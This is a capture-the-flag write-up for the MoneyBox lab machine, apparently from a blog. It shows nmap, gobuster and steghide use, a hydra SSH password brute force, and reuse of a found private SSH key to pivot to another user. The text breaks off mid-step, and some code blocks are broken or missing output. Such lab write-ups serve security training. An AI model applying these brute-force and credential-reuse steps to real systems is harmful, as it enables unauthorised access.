[Details](https://www.vulnhub.com/entry/moneybox-1,653/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.89.230
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-13 15:48 EST
Nmap scan report for 192.168.89.230
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
```

## port 21 (`ftp`)
Testing for anonymous access.
```bash
$ ftp 192.168.89.230

Lets download the file `trytofind.jpg`
```

```

## port 80 (web server)
We are starting with some dir busting.
```bash
$ gobuster dir -u http://192.168.89.230/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403

So, we continue with requesting the resource `/S3cr3t-T3xt`.

<!..Secret Key 3xtr4ctd4t4 >

```

> We got a 'secret' key with the value `3xtr4ctd4t4`.
{: .prompt-info }

## combining things
From the `ftp` service we got a file named `trytofind.jpg` which indicates that maybe some kind of steganography is used here.  
Additionally we know a secret key with the value `3xtr4ctd4t4`.   
  
If you research a bit you soon will see a tool named `steghide` which uses a secret key to hide information in pictures. Let us try to extract information from the picture `trytofind.jpg` with the secret key `3xtr4ctd4t4`.

```bash
$ steghide extract -sf trytofind.jpg                                                                                                                                                                                                  1 тип
Enter passphrase: 
wrote extracted data to "data.txt".
```

It worked! Lets have a look what data was extracted.
```bash
$ cat data.txt  
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

# exploitation
## `ssh` brute force
Now we know that the admin has the name `renu` and that he uses a weak password. Lets try to brute force his `ssh` account with `hydra`.
```bash
$ hydra -V -l renu -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt 192.168.89.230 ssh                                                                                                                        130 тип

## privilege escalation

We start with checking if we are allowed to execute commands as a super user.
```bash
$ sudo -l
[sudo] password for renu: 
Sorry, user renu may not run sudo on MoneyBox.
```

> Unfortunately we are not allowed to.  
{: .prompt-danger }
  
Now lets review the `.bash_history` of user `renu`.  
Inside the history file we spot the following interesting lines.
```bash
renu@MoneyBox:~$ cat .bash_history 
...
cd /home
ls
cd lily
ls
ls -la
clear
cd
clear
ssh-keygen -t rsa
clear
cd .ssh
ls
ssh-copy-id lily@192.168.43.80
clear
cd
cd -
ls -l
chmod 400 id_rsa
ls -l
ssh -i id_rsa lily@192.168.43.80
clear
ssh -i id_rsa lily@192.168.43.80
cd
clear
cd .ssh/
ls
ssh -i id_rsa lily@192.168.43.80
...
```

It seems that user `renu` has a `ssh` private key in his `.ssh` folder which allows him to connect as user `lily` to the server. Lets verifiy this.
```bash
renu@MoneyBox:~$ cd
renu@MoneyBox:~$ cd .ssh/
renu@MoneyBox:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts
renu@MoneyBox:~/.ssh$ ssh -i id_rsa lily@127.0.0.1
